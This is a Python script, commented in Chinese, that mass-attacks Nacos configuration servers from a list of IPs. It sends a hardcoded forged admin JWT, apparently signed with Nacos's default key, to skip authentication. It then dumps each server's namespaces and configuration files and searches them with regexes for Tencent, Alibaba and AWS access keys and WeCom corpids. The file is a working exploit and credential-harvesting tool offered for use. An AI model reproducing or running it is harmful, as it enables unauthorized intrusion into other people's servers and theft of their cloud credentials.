# -*- coding:utf-8 -*-
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading
import re
import chardet
import argparse

# 创建argparse解析器
parser = argparse.ArgumentParser(description='获取指定IP的Nacos配置，IP放入ips.txt中，每行一个，无需加端口号')
parser.add_argument('-t', '--target', type=str, help='ips.txt文件的路径.', required=True)
args = parser.parse_args()  # 解析命令行参数

# 根据命令行参数更新输入文件名
input_file_ip = args.target
output_file_config = 'results_config.txt'  # 配置输出文件
output_file_findsome = 'results_findsome.txt'  # 分析结果输出文件

# 全局线程锁，用于保护文件写入操作
lock = threading.Lock()


def getip():
    """从文件中读取IP列表"""
    with open(input_file_ip, "r") as file:
        ips = [line.strip() for line in file if line.strip()]  # 去除每行两端的空白字符并过滤掉空行
    return ips


def write_to_file(filename, content):
    """向文件写入内容"""
    # 使用线程锁保护文件写入操作
    with lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(content)


def getnamespace(ip):
    """获取指定IP的Nacos命名空间配置"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.9.25 (KHTML, like Gecko) Version/12.0 Safari/1200.9.25",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q"
    }

    base_url = f"http://{ip}:8848/nacos/v1/console/namespaces?&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q&namespaceId= "
    config_url = f"http://{ip}:8848/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant={{tenant}}&search=accurate&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q&username=nacos"

    try:
        response = requests.get(url=base_url, headers=headers)
        try:
            data = response.json()
            data_items = data.get('data', [])
            if len(data_items) <= 1:
                response = requests.get(url=config_url.format(tenant=''), headers=headers)
                result = f"ip为：{ip}，数据为：\n{response.text}\n\n\n"
                write_to_file(output_file_config, result)
            else:
                results_names = []
                for namespace_item in data_items:
                    if namespace_item['namespace'] == '':
                        response = requests.get(url=config_url.format(tenant=''), headers=headers)
                        results_names.append(response.text)
                    else:
                        namespace = namespace_item['namespace']
                        response = requests.get(url=config_url.format(tenant=namespace), headers=headers)
                        results_names.append(response.text)
                result = f"namespace大于1的情况,ip为：{ip}，数据为：\n{''.join(results_names)}\n\n\n"
                write_to_file(output_file_config, result)
        except json.JSONDecodeError as e:
            result = f"无法解析JSON数据,ip为：{ip} 错误详情：{e}\n\n\n"
            write_to_file(output_file_config, result)
            print(f"Error: {ip}无法解析JSON数据。错误详情：{e}")
    except Exception as e:
        result = f"访问错误,ip为：{ip},原因{e}\n\n\n"
        write_to_file(output_file_config, result)
        print(f"{ip} 访问错误 {e}")


def main():
    """获取配置的主函数"""
    ips = getip()

    # 使用多线程并发处理每个IP地址
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(getnamespace, ip): ip for ip in ips}

        # 显示进度条
        for future in tqdm(as_completed(futures), total=len(ips), desc="获取配置中："):
            # 结果由`write_to_file`函数负责写入文件
            pass


def detect_encoding(file_path):
    """自动获取文件编码，防止报错"""
    with open(file_path, 'rb') as f:
        result = chardet.detect(f.read())
    return result['encoding']


def find_info():
    """分析配置文件并查找特定信息"""
    print(f"获取配置结束，结果已经保存到{output_file_config}中，开始分析配置文件……")

    # 所需匹配信息的正则
    patterns = [
        r'\s*AKID\S{32}\s*',  # 腾讯云AK
        r'\s*LTAI\S{20}\s*',  # 阿里云AK
        r'\s*AKIA\S{16}\s*',  # AWS云AK
        r'corpid:\s*([a-zA-Z0-9_\-]+)',  # 企微的corpid
    ]

    # 编译正则表达式
    compiled_patterns = [re.compile(pattern) for pattern in patterns]

    results = set()  # 使用集合存放匹配结果，自动去重

    encoding = detect_encoding(output_file_config)
    print(f"Detected encoding: {encoding}")

    # 打开文件
    try:
        with open(output_file_config, 'r', encoding=encoding) as file:
            for line_number, line in enumerate(file, 1):  # 使用enumerate来获取行号
                line = line.rstrip()  # 去除行尾的换行符
                if line.startswith('{'):
                    for regex in compiled_patterns:
                        matches = regex.findall(line)
                        if matches:
                            results.update(matches)  # 更新结果集
                            print(f"在第 {line_number} 行找到匹配项:")
                            for match in matches:
                                print(f"  - {match.strip()}")
    except FileNotFoundError:
        print(f"错误：文件 '{output_file_config}' 未找到，请确保文件存在并且位于正确的路径下!")
    except Exception as e:
        print(f"发生了一个错误：{e}")

    # 将结果写入到文件
    try:
        with open(output_file_findsome, 'w') as output_file:
            for result in sorted(results):
                output_file.write(result.strip() + '\n')
        print(f"结果已写入到 '{output_file_findsome}' 文件中。")
    except IOError as e:
        print(f"无法写入文件：{e}")


if __name__ == '__main__':
    main()
    find_info()